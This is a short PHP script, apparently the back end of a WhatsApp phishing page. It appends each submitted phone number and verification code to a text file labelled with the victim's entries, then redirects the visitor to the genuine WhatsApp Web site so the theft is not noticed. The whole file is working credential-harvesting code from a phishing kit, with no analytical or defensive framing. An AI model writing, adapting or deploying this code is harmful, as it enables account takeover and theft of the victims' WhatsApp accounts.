<?php

file_put_contents("usernames.txt", "WhatsApp Phone: " . $_POST['username'] . " Code: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://web.whatsapp.com');
exit();
?>
